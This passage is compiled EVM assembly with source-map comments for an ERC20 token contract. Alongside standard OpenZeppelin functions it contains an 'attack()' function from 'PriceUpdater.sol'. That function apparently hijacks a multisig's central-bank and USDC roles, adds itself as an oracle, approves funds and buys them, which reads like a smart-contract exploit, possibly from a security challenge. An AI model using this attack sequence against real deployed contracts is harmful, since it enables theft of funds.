\"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4586:4593  spender */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4595:4601  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4570:4578  _approve */\n      tag_77\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4570:4602  _approve(owner, spender, amount) */\n      jump\t// in\n    tag_76:\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4619:4623  true */\n      0x01\n      swap4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4433:4630  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5192:5478  function transferFrom(... */\n    tag_33:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5319:5323  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5375:5413  _spendAllowance(from, spender, amount) */\n      tag_81\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5391:5395  from */\n      dup6\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5406:5412  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5375:5390  _spendAllowance */\n      tag_82\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5375:5413  _spendAllowance(from, spender, amount) */\n      jump\t// in\n    tag_81:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5423:5450  _transfer(from, to, amount) */\n      tag_83\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5433:5437  from */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5439:5441  to */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5443:5449  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5423:5432  _transfer */\n      tag_84\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5423:5450  _transfer(from, to, amount) */\n      jump\t// in\n    tag_83:\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5467:5471  true */\n      0x01\n      swap5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5192:5478  function transferFrom(... */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5873:6107  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_41:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":5961:5965  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6015:6079  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      tag_76\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6031:6038  spender */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6068:6078  addedValue */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6040:6065  allowance(owner, spender) */\n      tag_89\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6031:6038  spender */\n      dup4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6040:6049  allowance */\n      tag_64\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6040:6065  allowance(owner, spender) */\n      jump\t// in\n    tag_89:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6040:6078  allowance(owner, spender) + addedValue */\n      tag_90\n      swap2\n      swap1\n      tag_91\n      jump\t// in\n    tag_90:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6015:6023  _approve */\n      tag_77\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6015:6079  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2367:2469  function symbol() public view virtual override returns (string memory) {... */\n    tag_49:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2423:2436  string memory */\n      0x60\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2455:2462  _symbol */\n      0x04\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2448:2462  return _symbol */\n      dup1\n      sload\n      tag_67\n      swap1\n      tag_68\n      jump\t// in\n        /* \"contracts/PriceUpdater.sol\":775:1107  function attack() public {... */\n    tag_52:\n        /* \"contracts/PriceUpdater.sol\":815:819  cbdc */\n      sload(0x05)\n        /* \"contracts/PriceUpdater.sol\":810:838  CBDC(cbdc).addOracle(\"bank\") */\n      mload(0x40)\n      0xc994bc8600000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"contracts/PriceUpdater.sol\":815:819  cbdc */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/PriceUpdater.sol\":810:830  CBDC(cbdc).addOracle */\n      0xc994bc86\n      swap1\n        /* \"contracts/PriceUpdater.sol\":810:838  CBDC(cbdc).addOracle(\"bank\") */\n      tag_100\n      swap1\n      0x04\n      add\n        /* \"#utility.yul\":5465:5467   */\n      0x20\n        /* \"#utility.yul\":5447:5468   */\n      dup1\n      dup3\n      mstore\n        /* \"#utility.yul\":5504:5505   */\n      0x04\n        /* \"#utility.yul\":5484:5502   */\n      swap1\n      dup3\n      add\n        /* \"#utility.yul\":5477:5506   */\n      mstore\n        /* \"#utility.yul\":5542:5548   */\n      0x62616e6b00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":5537:5539   */\n      0x40\n        /* \"#utility.yul\":5522:5540   */\n      dup3\n      add\n        /* \"#utility.yul\":5515:5549   */\n      mstore\n        /* \"#utility.yul\":5581:5583   */\n      0x60\n        /* \"#utility.yul\":5566:5584   */\n      add\n      swap1\n        /* \"#utility.yul\":5263:5590   */\n      jump\n        /* \"contracts/PriceUpdater.sol\":810:838  CBDC(cbdc).addOracle(\"bank\") */\n    tag_100:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_102\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_102:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_104\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_104:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":857:865  multisig */\n      sload(0x06)\n        /* \"contracts/PriceUpdater.sol\":848:899  MultiSig(multisig).updateCentralBank(address(this)) */\n      mload(0x40)\n      0x077bf51a00000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":893:897  this */\n      address\n        /* \"contracts/PriceUpdater.sol\":848:899  MultiSig(multisig).updateCentralBank(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1691:1765   */\n      mstore\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"contracts/PriceUpdater.sol\":857:865  multisig */\n      swap1\n      swap2\n      and\n      swap3\n      pop\n        /* \"contracts/PriceUpdater.sol\":848:884  MultiSig(multisig).updateCentralBank */\n      0x077bf51a\n      swap2\n      pop\n        /* \"#utility.yul\":1664:1682   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":848:899  MultiSig(multisig).updateCentralBank(address(this)) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_107\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_107:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_109\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_109:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":918:926  multisig */\n      sload(0x06)\n        /* \"contracts/PriceUpdater.sol\":909:954  MultiSig(multisig).upgradeUSDC(address(this)) */\n      mload(0x40)\n      0x8cba468600000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":948:952  this */\n      address\n        /* \"contracts/PriceUpdater.sol\":909:954  MultiSig(multisig).upgradeUSDC(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1691:1765   */\n      mstore\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"contracts/PriceUpdater.sol\":918:926  multisig */\n      swap1\n      swap2\n      and\n      swap3\n      pop\n        /* \"contracts/PriceUpdater.sol\":909:939  MultiSig(multisig).upgradeUSDC */\n      0x8cba4686\n      swap2\n      pop\n        /* \"#utility.yul\":1664:1682   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":909:954  MultiSig(multisig).upgradeUSDC(address(this)) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_111\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_111:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_113\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_113:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":988:996  multisig */\n      sload(0x06)\n        /* \"contracts/PriceUpdater.sol\":964:1012  _approve(address(this), multisig, 1000000000000) */\n      tag_114\n      swap3\n      pop\n        /* \"contracts/PriceUpdater.sol\":981:985  this */\n      address\n      swap2\n      pop\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"contracts/PriceUpdater.sol\":988:996  multisig */\n      and\n        /* \"contracts/PriceUpdater.sol\":998:1011  1000000000000 */\n      0xe8d4a51000\n        /* \"contracts/PriceUpdater.sol\":964:972  _approve */\n      tag_77\n        /* \"contracts/PriceUpdater.sol\":964:1012  _approve(address(this), multisig, 1000000000000) */\n      jump\t// in\n    tag_114:\n        /* \"contracts/PriceUpdater.sol\":1031:1039  multisig */\n      0x06\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(exp(0x02, 0xa0), 0x01)\n      and\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"contracts/PriceUpdater.sol\":1022:1055  MultiSig(multisig).buyFundsPublic */\n      and\n      0xf99a1f30\n        /* \"contracts/PriceUpdater.sol\":1022:1057  MultiSig(multisig).buyFundsPublic() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0x0100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_115\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_115:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_117\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_117:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":1072:1076  cbdc */\n      sload(0x05)\n        /* \"contracts/PriceUpdater.sol\":1067:1100  CBDC(cbdc).transfer(msg.sender,1) */\n      mload(0x40)\n      0xa9059cbb00000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":1087:1097  msg.sender */\n      caller\n        /* \"contracts/PriceUpdater.sol\":1067:1100  CBDC(cbdc).transfer(msg.sender,1) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1958:2032   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":1072:1076  cbdc */\n      0x01\n        /* \"#utility.yul\":2048:2066   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":2041:2075   */\n      mstore\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"contracts/PriceUpdater.sol\":1072:1076  cbdc */\n      swap1\n      swap2\n      and\n      swap3\n      pop\n        /* \"contracts/PriceUpdater.sol\":1067:1086  CBDC(cbdc).transfer */\n      0xa9059cbb\n      swap2\n      pop\n        /* \"#utility.yul\":1931:1949   */\n      0x44\n      add\n        /* \"contracts/PriceUpdater.sol\":1067:1100  CBDC(cbdc).transfer(msg.sender,1) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_120\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_120:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_122\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_122:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_123\n      swap2\n      swap1\n      tag_124\n      jump\t// in\n    tag_123:\n      pop\n        /* \"contracts/PriceUpdater.sol\":775:1107  function attack() public {... */\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6594:7021  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_55:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6687:6691  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6687:6691  bool */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6768:6793  allowance(owner, spender) */\n      tag_127\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6785:6792  spender */\n      dup7\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6768:6777  allowance */\n      tag_64\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6768:6793  allowance(owner, spender) */\n      jump\t// in\n    tag_127:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6741:6793  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6831:6846  subtractedValue */\n      dup4\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6811:6827  currentAllowance */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6811:6846  currentAllowance >= subtractedValue */\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6803:6888  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      tag_128\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":5797:5799   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6803:6888  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5779:5800   */\n      mstore\n        /* \"#utility.yul\":5836:5838   */\n      0x25\n        /* \"#utility.yul\":5816:5834   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5809:5839   */\n      mstore\n        /* \"#utility.yul\":5875:5909   */\n      0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77\n        /* \"#utility.yul\":5855:5873   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5848:5910   */\n      mstore\n        /* \"#utility.yul\":5946:5953   */\n      0x207a65726f000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":5926:5944   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5919:5954   */\n      mstore\n        /* \"#utility.yul\":5971:5990   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6803:6888  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n    tag_129:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_128:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6922:6982  _approve(owner, spender, currentAllowance - subtractedValue) */\n      tag_83\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6931:6936  owner */\n      dup3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6938:6945  spender */\n      dup7\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6966:6981  subtractedValue */\n      dup7\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6947:6963  currentAllowance */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6947:6981  currentAllowance - subtractedValue */\n      sub\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6922:6930  _approve */\n      tag_77\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":6922:6982  _approve(owner, spender, currentAllowance - subtractedValue) */\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3729:3918  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_59:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3808:3812  bool */\n      0x00\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      caller\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3862:3890  _transfer(owner, to, amount) */\n      tag_76\n        /* \"@openzeppelin/contracts/utils/Context.sol\":719:729  msg.sender */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3879:3881  to */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3883:3889  amount */\n      dup6\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3862:3871  _transfer */\n      tag_84\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3862:3890  _transfer(owner, to, amount) */\n      jump\t// in\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3976:4125  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_64:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4091:4109  _allowances[owner] */\n      swap2\n      dup3\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4065:4072  uint256 */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4091:4109  _allowances[owner] */\n      swap1\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4091:4102  _allowances */\n      0x01\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4091:4109  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":4091:4118  _allowances[owner][spender] */\n      swap4\n      swap1\n      swap5\n      and\n      dup3\n      mstore\n      swap2\n      swap1\n      swap2\n      mstore\n      keccak256\n      sload\n      swap1\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":3976:4125  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10110:10480  function _approve(... */\n    tag_77:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10241:10260  owner != address(0) */\n      dup4\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10233:10301  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_138\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":5060:5062   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10233:10301  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5042:5063   */\n      mstore\n        /* \"#utility.yul\":5099:5101   */\n      0x24\n        /* \"#utility.yul\":5079:5097   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":5072:5102   */\n      mstore\n        /* \"#utility.yul\":5138:5172   */\n      0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n        /* \"#utility.yul\":5118:5136   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5111:5173   */\n      mstore\n        /* \"#utility.yul\":5209:5215   */\n      0x7265737300000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":5189:5207   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":5182:5216   */\n      mstore\n        /* \"#utility.yul\":5233:5252   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10233:10301  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_129\n        /* \"#utility.yul\":4858:5258   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10233:10301  require(owner != address(0), \"ERC20: approve from the zero address\") */\n    tag_138:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10319:10340  spender != address(0) */\n      dup3\n      and\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10311:10379  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_141\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":3486:3488   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10311:10379  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3468:3489   */\n      mstore\n        /* \"#utility.yul\":3525:3527   */\n      0x22\n        /* \"#utility.yul\":3505:3523   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3498:3528   */\n      mstore\n        /* \"#utility.yul\":3564:3598   */\n      0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n        /* \"#utility.yul\":3544:3562   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3537:3599   */\n      mstore\n        /* \"#utility.yul\":3635:3639   */\n      0x7373000000000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3615:3633   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3608:3640   */\n      mstore\n        /* \"#utility.yul\":3657:3676   */\n      0x84\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10311:10379  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_129\n        /* \"#utility.yul\":3284:3682   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10311:10379  require(spender != address(0), \"ERC20: approve to the zero address\") */\n    tag_141:\n      sub(exp(0x02, 0xa0), 0x01)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10390:10408  _allowances[owner] */\n      dup4\n      dup2\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10390:10401  _allowances */\n      0x01\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10390:10408  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10390:10417  _allowances[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10390:10426  _allowances[owner][spender] = amount */\n      dup6\n      swap1\n      sstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10441:10473  Approval(owner, spender, amount) */\n      swap1\n      mload\n        /* \"#utility.yul\":6147:6172   */\n      dup5\n      dup2\n      mstore\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10441:10473  Approval(owner, spender, amount) */\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap2\n        /* \"#utility.yul\":6120:6138   */\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10441:10473  Approval(owner, spender, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10110:10480  function _approve(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10761:11202  function _spendAllowance(... */\n    tag_82:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10891:10915  uint256 currentAllowance */\n      0x00\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10918:10943  allowance(owner, spender) */\n      tag_146\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10928:10933  owner */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10935:10942  spender */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10918:10927  allowance */\n      tag_64\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10918:10943  allowance(owner, spender) */\n      jump\t// in\n    tag_146:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10891:10943  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n      not(0x00)\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10957:10973  currentAllowance */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10957:10994  currentAllowance != type(uint256).max */\n      eq\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10953:11196  if (currentAllowance != type(uint256).max) {... */\n      tag_151\n      jumpi\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11038:11044  amount */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11018:11034  currentAllowance */\n      dup2\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11018:11044  currentAllowance >= amount */\n      lt\n      iszero\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11010:11078  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_148\n      jumpi\n      mload(0x40)\n      mul(0x461bcd, exp(0x02, 0xe5))\n      dup2\n      mstore\n        /* \"#utility.yul\":3889:3891   */\n      0x20\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11010:11078  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3871:3892   */\n      mstore\n        /* \"#utility.yul\":3928:3930   */\n      0x1d\n        /* \"#utility.yul\":3908:3926   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3901:3931   */\n      mstore\n        /* \"#utility.yul\":3967:3998   */\n      0x45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000\n        /* \"#utility.yul\":3947:3965   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3940:3999   */\n      mstore\n        /* \"#utility.yul\":4016:4034   */\n      0x64\n      add\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11010:11078  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_129\n        /* \"#utility.yul\":3687:4040   */\n      jump\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11010:11078  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n    tag_148:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11120:11171  _approve(owner, spender, currentAllowance - amount) */\n      tag_151\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11129:11134  owner */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11136:11143  spender */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11164:11170  amount */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11145:11161  currentAllowance */\n      dup5\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11145:11170  currentAllowance - amount */\n      sub\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11120:11128  _approve */\n      tag_77\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":11120:11171  _approve(owner, spender, currentAllowance - amount) */\n      jump\t// in\n    tag_151:\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10881:11202  {... */\n      pop\n        /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":10761:11202  function _spendAllowance(... 